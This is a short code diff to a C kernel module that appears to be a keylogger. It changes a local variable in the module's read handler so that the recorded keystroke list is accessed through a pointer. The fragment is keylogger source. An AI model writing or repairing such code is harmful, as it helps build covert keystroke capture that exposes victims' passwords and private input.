@@ -20,7 +20,7 @@ t_keylogger_data keylogger_data;
 
 static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff_t *_offset)
 {
-	t_entry_lst lst = keylogger_data.entry_lst;
+	t_entry_lst *lst = keylogger_data.entry_lst;
 	size_t cread = 0;
 	ssize_t ret = 0;
 
